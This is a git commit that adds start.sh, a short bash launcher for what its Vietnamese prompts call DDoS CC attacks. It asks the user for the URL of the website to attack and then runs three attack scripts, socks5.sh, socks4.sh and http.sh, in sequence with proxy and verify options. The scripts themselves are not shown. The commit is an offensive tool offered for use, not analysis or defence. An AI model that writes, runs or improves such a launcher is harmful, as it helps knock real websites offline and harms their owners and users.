80b335759565a9c255ecb7a27b98de79ac8bb148
Ling <59746573+ndbiaw@users.noreply.github.com>
2022-10-21 14:04:54 +0700

    Update automate linux shell

---
+++ start.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+echo Nhan Enter de tiep tuc. Sau khi an Enter se khoi chay 3 quy trinh tan cong DDoS CC cung luc. De co tuy chon khac, vui long su sung Termial.
+echo Nhap URL trang web can tan cong:
+read URL
+PROXY="./"
+VERIFY="-down -check"
+export URL PROXY VERIFY
+./socks5.sh "$URL" "$PROXY" "$VERIFY" && ./socks4.sh "$URL" "$PROXY" "$VERIFY" && ./http.sh "$URL" "$PROXY" "$VERIFY"
